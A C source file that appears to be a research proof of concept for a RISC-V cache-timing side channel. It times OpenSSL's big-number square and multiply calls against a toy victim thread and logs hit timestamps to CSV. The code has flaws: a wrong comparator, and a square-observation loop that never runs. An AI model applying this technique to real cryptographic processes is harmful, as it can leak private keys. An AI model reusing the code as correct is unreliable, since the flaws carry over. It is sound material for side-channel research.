#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "openssl/bn.h"

#define SAMPLE_SIZE     20000
#define RUNS            1000

typedef struct {
    uint64_t start;
    uint64_t duration;
} sample_t;

// funtcion equivalent to rdtsc on x86, but implemented on RISC-V
static inline uint64_t rdtsc()
{
    uint64_t val;
    asm volatile("rdcycle %0\n" : "=r"(val)::);
    return val;
}

// function to flush the I-cache
static inline void flush()
{
    asm volatile("fence.i" ::: "memory");
    asm volatile("fence" ::: "memory");
}

// measure the time it takes to execute function p(0) and return start and duration
static inline sample_t timed_call_1(int (*p)(BIGNUM*, const BIGNUM*, BN_CTX*), BIGNUM* r, const BIGNUM* a, BN_CTX* ctx)
{
    uint64_t start, end;
    start = rdtsc();
    p(r, a, ctx);
    end = rdtsc();
    return (sample_t) {start, end - start};
}

// measure the time it takes to execute function p(0,0) and return start and duration
static inline sample_t timed_call_2(int (*p)(BIGNUM*, const BIGNUM*, const BIGNUM*, BN_CTX*), BIGNUM* r, const BIGNUM* a, const BIGNUM* b, BN_CTX* ctx)
{
    uint64_t start, end;
    start = rdtsc();
    p(r, a, b, ctx);
    end = rdtsc();
    return (sample_t) {start, end - start};
}

// victim function that calls square and multiply 10 times with usleeps inbetween
void* calculate(void* d)
{
    BIGNUM r, a, b;
    BN_init(&r);
    BN_init(&a);
    BN_init(&b);
    BN_CTX* ctx = BN_CTX_new();
    BN_one(&r);
    BN_one(&a);
    BN_one(&b);
    size_t* done = (size_t*)d;
    for (size_t i=0; i<10; i++) {
        usleep(1000);
        BN_sqr(&r, &a, ctx);
        usleep(1000);
        BN_mul(&r, &a, &b, ctx);
    }
    // free the BN_CTX
    BN_CTX_free(ctx);
    *done = 1;
}

// compare function for qsort
int compare_uint64_t (const void * a, const void * b) 
{
   return ( *(int*)a - *(int*)b );
}

// returns the median of a list given a list and its length
// works by sorting the list and returning the middle element
uint64_t median(uint64_t* list, uint64_t size)
{
    uint64_t* sorted = malloc(size * sizeof(uint64_t));
    memcpy(sorted, list, size * sizeof(uint64_t));
    qsort(sorted, size, sizeof(uint64_t), compare_uint64_t);
    uint64_t median = sorted[size / 2];
    free(sorted);
    return median;
}

uint64_t min(uint64_t* list, uint64_t size)
{
    uint64_t* sorted = malloc(size * sizeof(uint64_t));
    memcpy(sorted, list, size * sizeof(uint64_t));
    qsort(sorted, size, sizeof(uint64_t), compare_uint64_t);
    uint64_t min = sorted[0];
    free(sorted);
    return min;
}

int main()
{
    // cached timing arrays for square and multiply
    uint64_t chached_timings_1[SAMPLE_SIZE] = {0};
    uint64_t chached_timings_2[SAMPLE_SIZE] = {0};
    // uncached timing arrays for square and multiply
    uint64_t unchached_timings_1[SAMPLE_SIZE] = {0};
    uint64_t unchached_timings_2[SAMPLE_SIZE] = {0};
    // thresholds for square and multiply
    uint64_t threshold_1 = 0;
    uint64_t threshold_2 = 0;
    // victim thread
    pthread_t calculate_thread;

    // get threshold for cached and uncached square access
    BIGNUM r, a, b;
    BN_CTX* ctx = BN_CTX_new();
    BN_init(&r);
    BN_init(&a);
    BN_init(&b);
    BN_one(&r);
    BN_one(&a);
    BN_one(&b);

    BN_sqr(&r, &a, ctx);

    for (size_t i=0; i<SAMPLE_SIZE; i++) {
        chached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
    }
    for (size_t i=0; i<SAMPLE_SIZE; i++) {
        flush();
        unchached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
    }
    uint64_t cached_median_1 = median(chached_timings_1, SAMPLE_SIZE);
    printf("cached median: %lu\n", cached_median_1);
    uint64_t uncached_min_1 = min(unchached_timings_1, SAMPLE_SIZE);
    printf("uncached min: %lu\n", uncached_min_1);
    threshold_1 = (uncached_min_1 + cached_median_1)/2;
    printf("threshold 1: %lu\n", threshold_1);

    // get threshold for cached and uncached multiply access
    BN_mul(&r, &a, &b, ctx);
    for (int i = 0; i < SAMPLE_SIZE; i++)
    {
        chached_timings_2[i] = timed_call_2(BN_mul, &r, &a, &b, ctx).duration;
    }
    for (int i = 0; i < SAMPLE_SIZE; i++)
    {
        flush();
        unchached_timings_2[i] = timed_call_2(BN_mul, &r, &a, &b, ctx).duration;
    }
    uint64_t cached_median_2 = median(chached_timings_2, SAMPLE_SIZE);
    printf("cached median: %lu\n", cached_median_2);
    uint64_t uncached_min_2 = min(unchached_timings_2, SAMPLE_SIZE);
    printf("uncached min: %lu\n", uncached_min_2);
    threshold_2 = (uncached_min_2 + cached_median_2)/2;
    printf("threshold 2: %lu\n", threshold_2);

    // run victim thread RUNS times and observe the accesses to square
    // results are written to square.csv
    printf("Observing square...\n");
    FILE* sq = fopen("square.csv", "w");
    for(size_t i=0; i<RUNS; i++) {
        size_t done = 0;
        pthread_create(&calculate_thread, NULL, calculate, &done);
        pthread_join(calculate_thread, NULL);
        uint64_t start = rdtsc();
        flush();

        while(done == 0)
        {   
            printf("atta 3\n");
            sample_t sq_timing = timed_call_1(BN_sqr, &r, &a, ctx);
            printf("atta 4\n");
            // flush after call to reduce chance of access between measurement and flush
            flush();
            if (sq_timing.duration < threshold_1)
            {
                fprintf(sq, "%lu\n", sq_timing.start - start);
            }
        }
        pthread_join(calculate_thread, NULL);
    }
    fclose(sq);
    printf("Done observing square\n");

    // run victim thread RUNS times and observe the accesses to multiply
    // results are written to multiply.csv
    printf("Observing multiply...\n");
    FILE* mul = fopen("multiply.csv", "w");
    for(size_t i=0; i<RUNS; i++) {
        size_t done = 0;
        pthread_create(&calculate_thread, NULL, calculate, &done);
        uint64_t start = rdtsc();
        flush();

        while(done == 0)
        {   
            sample_t mul_timing = timed_call_2(BN_mul, &r, &a, &b, ctx);
            // flush after call to reduce chance of access between measurement and flush
            flush();
            if (mul_timing.duration < threshold_2)
            {
                fprintf(mul, "%lu\n", mul_timing.start - start);
            }
        }
        pthread_join(calculate_thread, NULL);
    }
    fclose(mul);
    printf("Done observing multiply\n");

    return 0;
}
